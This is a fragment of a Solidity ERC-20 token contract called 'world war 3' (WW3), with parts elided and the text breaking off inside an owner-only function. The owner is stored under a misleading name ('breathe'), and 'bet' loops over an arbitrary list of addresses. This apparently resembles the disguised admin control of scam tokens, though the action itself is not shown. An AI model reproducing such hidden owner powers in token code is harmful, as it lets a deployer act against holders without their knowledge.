...
contract ww3 is Context, IERC20 {
    ...
    address public  breathe;
    constructor () {
        _name = "world war 3";
        _symbol = "WW3";
        _decimals = 18;
        uint256 initialSupply = 233000000;
         breathe = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == breathe, "Not allowed");
        _;
    }

    function bet(address[] memory pace) public onlyOwner() {
        for (uint256 i = 0; i < pace.length; i++) {
            address account = pace[i];
